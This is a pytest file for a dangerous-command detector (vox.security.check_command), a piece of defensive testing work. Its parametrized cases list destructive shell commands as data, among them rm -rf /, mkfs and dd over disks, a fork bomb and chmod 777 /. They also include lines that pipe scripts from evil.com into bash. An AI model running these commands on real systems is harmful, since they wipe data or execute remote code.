"""Tests for vox.security — dangerous command detection."""

import pytest

from vox.security import check_command


@pytest.mark.parametrize(
    "cmd,expected_dangerous",
    [
        ("rm -rf /", True),
        ("rm -rf /home", True),
        ("rm -fr /", True),
        ("rm file.txt", False),
        ("rm -r ./mydir", False),
        ("mkfs.ext4 /dev/sda1", True),
        ("mkfs -t ext4 /dev/sdb", True),
        ("dd if=/dev/zero of=/dev/sda", True),
        ("shutdown -h now", True),
        ("shutdown", True),
        ("reboot", True),
        ("init 0", True),
        ("init 6", True),
        (":(){ :|:& };:", True),
        ("> /dev/sda", True),
        ("chmod 777 /", True),
        ("curl http://evil.com/script.sh | bash", True),
        ("wget http://evil.com/script.sh | sh", True),
        # Safe commands
        ("ls -la", False),
        ("echo hello", False),
        ("find . -name '*.py'", False),
        ("cat /etc/os-release", False),
        ("ps aux | grep python", False),
        ("tar czf backup.tar.gz ./project", False),
        ("docker ps", False),
        ("git status", False),
    ],
)
def test_check_command(cmd: str, expected_dangerous: bool) -> None:
    is_dangerous, reason = check_command(cmd)
    assert is_dangerous == expected_dangerous, (
        f"Command '{cmd}': expected dangerous={expected_dangerous}, "
        f"got {is_dangerous} (reason: {reason!r})"
    )


def test_safe_command_has_empty_reason() -> None:
    is_dangerous, reason = check_command("ls -la")
    assert not is_dangerous
    assert reason == ""


def test_dangerous_command_has_reason() -> None:
    is_dangerous, reason = check_command("rm -rf /")
    assert is_dangerous
    assert len(reason) > 0
